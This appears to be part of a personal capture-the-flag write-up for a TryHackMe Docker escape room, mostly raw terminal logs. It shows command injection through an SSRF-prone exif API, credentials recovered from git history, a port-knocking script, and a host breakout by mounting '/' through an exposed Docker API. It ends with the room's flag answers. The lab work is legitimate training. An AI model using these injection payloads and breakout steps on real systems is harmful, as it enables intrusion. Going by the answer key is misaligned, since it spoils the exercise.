@@ -474,3 +474,480 @@ Content-Type: text/plain;charset=UTF-8
 Content-Length: 3287
 
 Connection: close
+
+An error occurred: HTTP Exception 500 Internal Server Error
+                Response was:
+                ---------------------------------------
+                <-- 500 http://api-dev-backup:8080/exif
+Response : Internal Server Error
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;whoami HTTP/1.1
+
+HTTP/1.1 200 OK
+
+Server: nginx/1.19.6
+
+Date: Fri, 07 Apr 2023 20:06:26 GMT
+
+Content-Type: text/plain;charset=UTF-8
+
+Content-Length: 414
+
+Connection: close
+
+An error occurred: File format could not be determined
+                Retrieved Content
+                ----------------------------------------
+                An error occurred: File format could not be determined
+               Retrieved Content
+               ----------------------------------------
+               curl: no URL specified!
+curl: try 'curl --help' or 'curl --manual' for more information
+root
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;id HTTP/1.1
+
+uid=0(root) gid=0(root) groups=0(root)
+
+cannot get a revshell doing manually 
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;ls+-lah+/root HTTP/1.1
+
+total 28K
+drwx------ 1 root root 4.0K Jan  7  2021 .
+drwxr-xr-x 1 root root 4.0K Jan  7  2021 ..
+lrwxrwxrwx 1 root root    9 Jan  6  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+drwxr-xr-x 1 root root 4.0K Jan  7  2021 .git
+-rw-r--r-- 1 root root   53 Jan  6  2021 .gitconfig
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+-rw-rw-r-- 1 root root  201 Jan  7  2021 dev-note.txt
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cat+/root/dev-note.txt HTTP/1.1
+
+Hey guys,
+
+Apparently leaving the flag and docker access on the server is a bad idea, or so the security guys tell me. I've deleted the stuff.
+
+Anyways, the password is fluffybunnies123
+
+Cheers,
+
+Hydra
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh hydra@10.10.85.253 -v
+OpenSSH_9.2p1 Debian-2, OpenSSL 3.0.8 7 Feb 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 10.10.85.253 [10.10.85.253] port 22.
+debug1: Connection established.
+debug1: identity file /home/witty/.ssh/id_rsa type 0
+debug1: identity file /home/witty/.ssh/id_rsa-cert type -1
+debug1: identity file /home/witty/.ssh/id_ecdsa type -1
+debug1: identity file /home/witty/.ssh/id_ecdsa-cert type -1
+debug1: identity file /home/witty/.ssh/id_ecdsa_sk type -1
+debug1: identity file /home/witty/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /home/witty/.ssh/id_ed25519 type -1
+debug1: identity file /home/witty/.ssh/id_ed25519-cert type -1
+debug1: identity file /home/witty/.ssh/id_ed25519_sk type -1
+debug1: identity file /home/witty/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /home/witty/.ssh/id_xmss type -1
+debug1: identity file /home/witty/.ssh/id_xmss-cert type -1
+debug1: identity file /home/witty/.ssh/id_dsa type -1
+debug1: identity file /home/witty/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.2p1 Debian-2
+debug1: kex_exchange_identification: banner line 0:  heQiE7 ]:{F
+debug1: kex_exchange_identification: banner line 1: {
+
+uhmm
+
+https://github.com/skeeto/endlessh
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl -v  http://10.10.85.253/api/login -d '{"username"\:"hydra","password"\:"fluffybunnies123"}'                                    
+*   Trying 10.10.85.253:80...
+* Connected to 10.10.85.253 (10.10.85.253) port 80 (#0)
+> POST /api/login HTTP/1.1
+> Host: 10.10.85.253
+> User-Agent: curl/7.87.0
+> Accept: */*
+> Content-Length: 52
+> Content-Type: application/x-www-form-urlencoded
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 415 Unsupported Media Type
+< Server: nginx/1.19.6
+< Date: Fri, 07 Apr 2023 20:18:26 GMT
+< Content-Length: 0
+< Connection: keep-alive
+< 
+* Connection #0 to host 10.10.85.253 left intact
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl -v  http://10.10.85.253/api/login -d '{"username"\:"hydra","password"\:"fluffybunnies123"}' -H "Content-Type: application/json"
+*   Trying 10.10.85.253:80...
+* Connected to 10.10.85.253 (10.10.85.253) port 80 (#0)
+> POST /api/login HTTP/1.1
+> Host: 10.10.85.253
+> User-Agent: curl/7.87.0
+> Accept: */*
+> Content-Type: application/json
+> Content-Length: 52
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 401 Unauthorized
+< Server: nginx/1.19.6
+< Date: Fri, 07 Apr 2023 20:18:57 GMT
+< Content-Type: application/json
+< Content-Length: 72
+< Connection: keep-alive
+< 
+{
+    "status": "ERROR",
+    "message": "Invalid Username or Password"
+* Connection #0 to host 10.10.85.253 left intact
+}  
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+log HTTP/1.1
+
+commit 5242825dfd6b96819f65d17a1c31a99fea4ffb6a
+Author: Hydra <hydragyrum@example.com>
+Date:   Thu Jan 7 16:48:58 2021 +0000
+
+    fixed the dev note
+
+commit 4530ff7f56b215fa9fe76c4d7cc1319960c4e539
+Author: Hydra <hydragyrum@example.com>
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Removed the flag and original dev note b/c Security
+
+commit a3d30a7d0510dc6565ff9316e3fb84434916dee8
+Author: Hydra <hydragyrum@example.com>
+Date:   Wed Jan 6 20:51:39 2021 +0000
+
+    Added the flag and dev notes
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+checkout+5242825dfd6b96819f65d17a1c31a99fea4ffb6a HTTP/1.1
+
+Note: checking out '5242825dfd6b96819f65d17a1c31a99fea4ffb6a'.
+
+You are in 'detached HEAD' state. You can look around, make experimental
+changes and commit them, and you can discard any commits you make in this
+state without impacting any branches by performing another checkout.
+
+If you want to create a new branch to retain commits you create, you may
+do so (now or later) by using -b with the checkout command again. Example:
+
+  git checkout -b <new-branch-name>
+
+HEAD is now at 5242825 fixed the dev note
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+checkout+4530ff7f56b215fa9fe76c4d7cc1319960c4e539 HTTP/1.1
+
+Previous HEAD position was 5242825 fixed the dev note
+HEAD is now at 4530ff7 Removed the flag and original dev note b/c Security
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cd+/root;git+checkout+a3d30a7d0510dc6565ff9316e3fb84434916dee8 HTTP/1.1
+
+Previous HEAD position was 4530ff7 Removed the flag and original dev note b/c Security
+HEAD is now at a3d30a7 Added the flag and dev notes
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cat+/root/flag.txt HTTP/1.1
+
+THM{0cb4b947043cb5c0486a454b75a10876}
+
+GET /api/exif?url=http://api-dev-backup:8080/exif?url=;cat+/root/dev-note.txt HTTP/1.1
+
+Hey guys,
+
+I got tired of losing the ssh key all the time so I setup a way to open up the docker for remote admin.
+
+Just knock on ports 42, 1337, 10420, 6969, and 63000 to open the docker tcp port.
+
+Cheers,
+
+Hydra
+```
+Find the root flag?
+Silly devs leaving their backups lying around...
+### The Great Escape
+You thought you had root. But the root on a docker container isn't all that helpful. Find the secret flag
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat knock_port.sh
+#! /bin/bash
+
+curl http://10.10.85.253:42 -m 1
+sleep 1
+curl http://10.10.85.253:1337 -m 1
+sleep 1
+curl http://10.10.85.253:10420 -m 1
+sleep 1
+curl http://10.10.85.253:6969 -m 1
+sleep 1
+curl http://10.10.85.253:63000 -m 1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ man curl | grep '\--max-time'
+              See also -m, --max-time.
+              See also -m, --max-time and --connect-timeout. Added in 7.59.0.
+              See also --no-keepalive and -m, --max-time.
+       -m, --max-time <fractional seconds>
+              If -m, --max-time is provided several times, the last set value will be used.
+               curl --max-time 10 https://example.com
+               curl --max-time 2.92 https://example.com
+              single request's maximum time, use -m, --max-time. Set this option  to  zero  to
+              See also -y, --speed-time, --limit-rate and -m, --max-time.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ bash knock_port.sh 
+curl: (7) Failed to connect to 10.10.85.253 port 42 after 197 ms: Couldn't connect to server
+curl: (7) Failed to connect to 10.10.85.253 port 1337 after 197 ms: Couldn't connect to server
+curl: (7) Failed to connect to 10.10.85.253 port 10420 after 203 ms: Couldn't connect to server
+curl: (7) Failed to connect to 10.10.85.253 port 6969 after 200 ms: Couldn't connect to server
+curl: (7) Failed to connect to 10.10.85.253 port 63000 after 219 ms: Couldn't connect to server
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rustscan -a 10.10.85.253 --ulimit 5500 -b 65535 -- -A -Pn
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+🌍HACK THE PLANET🌍
+
+[~] The config file is expected to be at "/home/witty/.rustscan.toml"
+[~] Automatically increasing ulimit value to 5500.
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+Open 10.10.85.253:22
+Open 10.10.85.253:80
+Open 10.10.85.253:2375
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+[~] Starting Nmap 7.93 ( https://nmap.org )
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Initiating Parallel DNS resolution of 1 host.
+Completed Parallel DNS resolution of 1 host.
+DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan
+Scanning 10.10.85.253 [3 ports]
+Discovered open port 80/tcp on 10.10.85.253
+Discovered open port 22/tcp on 10.10.85.253
+Discovered open port 2375/tcp on 10.10.85.253
+Completed Connect Scan (3 total ports)
+Initiating Service scan
+Scanning 3 services on 10.10.85.253
+Completed Service scan (3 services on 1 host)
+NSE: Script scanning 10.10.85.253.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Nmap scan report for 10.10.85.253
+Host is up, received user-set (0.19s latency).
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh?    syn-ack
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+| fingerprint-strings: 
+|   GenericLines: 
+|_    M|[nPeZ'A
+80/tcp   open  http    syn-ack nginx 1.19.6
+|_http-title: docker-escape-nuxt
+|_http-server-header: nginx/1.19.6
+|_http-favicon: Unknown favicon MD5: 67EDB7D39E1376FDD8A24B0C640D781E
+| http-robots.txt: 3 disallowed entries 
+|_/api/ /exif-util /*.bak.txt$
+| http-methods: 
+|_  Supported Methods: GET HEAD
+2375/tcp open  docker  syn-ack Docker 20.10.2 (API 1.41)
+| docker-version: 
+|   KernelVersion: 4.15.0-130-generic
+|   ApiVersion: 1.41
+|   Version: 20.10.2
+|   MinAPIVersion: 1.12
+|   Platform: 
+|     Name: Docker Engine - Community
+|   Os: linux
+|   Arch: amd64
+|   Components: 
+|     
+|       Details: 
+|         KernelVersion: 4.15.0-130-generic
+|         Experimental: false
+|         MinAPIVersion: 1.12
+|         GitCommit: 8891c58
+|         GoVersion: go1.13.15
+|         Arch: amd64
+|         Os: linux
+|         BuildTime: 2020-12-28T16:15:09.000000000+00:00
+|         ApiVersion: 1.41
+|       Name: Engine
+|       Version: 20.10.2
+|     
+|       Details: 
+|         GitCommit: 269548fa27e0089a8b8278fc4fc781d7f65a939b
+|       Name: containerd
+|       Version: 1.4.3
+|     
+|       Details: 
+|         GitCommit: ff819c7e9184c13b7c2607fe6c30ae19403a7aff
+|       Name: runc
+|       Version: 1.0.0-rc92
+|     
+|       Details: 
+|         GitCommit: de40ad0
+|       Name: docker-init
+|       Version: 0.19.0
+|   GoVersion: go1.13.15
+|   BuildTime: 2020-12-28T16:15:09.000000000+00:00
+|_  GitCommit: 8891c58
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port22-TCP:V=7.93%I=7%D=4/7%Time=64307E5F%P=x86_64-pc-linux-gnu%r(Gener
+SF:icLines,B,"M\|\[nPeZ'A\r\n");
+Service Info: OS: linux
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE
+Completed NSE
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE
+Completed NSE
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ docker -H 10.10.85.253:2375 ps
+CONTAINER ID   IMAGE          COMMAND                  CREATED       STATUS       PORTS                  NAMES
+49fe455a9681   frontend       "/docker-entrypoint.…"   2 years ago   Up 2 hours   0.0.0.0:80->80/tcp     dockerescapecompose_frontend_1
+4b51f5742aad   exif-api-dev   "./application -Dqua…"   2 years ago   Up 2 hours                          dockerescapecompose_api-dev-backup_1
+cb83912607b9   exif-api       "./application -Dqua…"   2 years ago   Up 2 hours   8080/tcp               dockerescapecompose_api_1
+548b701caa56   endlessh       "/endlessh -v"           2 years ago   Up 2 hours   0.0.0.0:22->2222/tcp   dockerescapecompose_endlessh_1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ docker -H 10.10.85.253:2375 images
+REPOSITORY                                    TAG       IMAGE ID       CREATED       SIZE
+exif-api-dev                                  latest    4084cb55e1c7   2 years ago   214MB
+exif-api                                      latest    923c5821b907   2 years ago   163MB
+frontend                                      latest    577f9da1362e   2 years ago   138MB
+endlessh                                      latest    7bde5182dc5e   2 years ago   5.67MB
+nginx                                         latest    ae2feff98a0c   2 years ago   133MB
+debian                                        10-slim   4a9cd57610d6   2 years ago   69.2MB
+registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   2 years ago   103MB
+alpine                                        3.9       78a2ce922f86   2 years ago   5.55MB
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ docker -H 10.10.85.253:2375 exec -it cb83912607b9 /bin/bash
+bash-4.4$ whoami
+quarkus
+bash-4.4$ id
+uid=1000(quarkus) gid=1000(quarkus) groups=1000(quarkus)
+bash-4.4$ ls
+application
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ docker -H 10.10.85.253:2375 exec -it 49fe455a9681 /bin/bash
+root@docker-escape:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@docker-escape:/# ls
+bin   dev		   docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var
+boot  docker-entrypoint.d  etc			 lib   media  opt  root  sbin  sys  usr
+root@docker-escape:/# cd root
+root@docker-escape:~# ls
+root@docker-escape:~# ls -lah
+total 16K
+drwx------ 2 root root 4.0K Dec  9  2020 .
+drwxr-xr-x 1 root root 4.0K Jan  7  2021 ..
+-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+root@docker-escape:~# cd ..
+root@docker-escape:/# ls
+bin   dev		   docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var
+boot  docker-entrypoint.d  etc			 lib   media  opt  root  sbin  sys  usr
+root@docker-escape:/# cd mnt
+root@docker-escape:/mnt# ls
+root@docker-escape:/mnt# exit
+exit
+                                                                                                 
+┌──(witty㉿kali)-[~/Downloads]
+└─$ docker -H 10.10.85.253:2375 exec -it 49fe455a9681 /bin/bash
+root@docker-escape:/# find / -type f -name flag.txt 2>/dev/null
+root@docker-escape:/# ^C
+root@docker-escape:/# exit
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ docker -H 10.10.85.253:2375 run -it -v /:/mnt/ 78a2ce922f86 /bin/sh
+/ # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/ # ls -lah /
+total 64
+drwxr-xr-x    1 root     root        4.0K Apr  7 20:54 .
+drwxr-xr-x    1 root     root        4.0K Apr  7 20:54 ..
+-rwxr-xr-x    1 root     root           0 Apr  7 20:54 .dockerenv
+drwxr-xr-x    2 root     root        4.0K Apr 23  2020 bin
+drwxr-xr-x    5 root     root         360 Apr  7 20:54 dev
+drwxr-xr-x    1 root     root        4.0K Apr  7 20:54 etc
+drwxr-xr-x    2 root     root        4.0K Apr 23  2020 home
+drwxr-xr-x    5 root     root        4.0K Apr 23  2020 lib
+drwxr-xr-x    5 root     root        4.0K Apr 23  2020 media
+drwxr-xr-x   22 root     root        4.0K Jan  9  2021 mnt
+drwxr-xr-x    2 root     root        4.0K Apr 23  2020 opt
+dr-xr-xr-x   96 root     root           0 Apr  7 20:54 proc
+drwx------    1 root     root        4.0K Apr  7 20:54 root
+drwxr-xr-x    2 root     root        4.0K Apr 23  2020 run
+drwxr-xr-x    2 root     root        4.0K Apr 23  2020 sbin
+drwxr-xr-x    2 root     root        4.0K Apr 23  2020 srv
+dr-xr-xr-x   13 root     root           0 Apr  7 20:54 sys
+drwxrwxrwt    2 root     root        4.0K Apr 23  2020 tmp
+drwxr-xr-x    7 root     root        4.0K Apr 23  2020 usr
+drwxr-xr-x   11 root     root        4.0K Apr 23  2020 var
+/ # cd /mnt/root
+/mnt/root # ls
+flag.txt
+/mnt/root # cat flag.txt
+Congrats, you found the real flag!
+
+THM{c62517c0cad93ac93a92b1315a32d734}
+/mnt/root # cd /;cat .dockerenv
+/
+```
+Find the real root flag
+
+## Flags / Answers
+- ***THM{b801135794bf1ed3a2aafaa44c2e5ad4}***
+- ***THM{0cb4b947043cb5c0486a454b75a10876}***
+- ***THM{c62517c0cad93ac93a92b1315a32d734}***
+
+## Notes / Lessons Learned
+[[Lookback]]
+
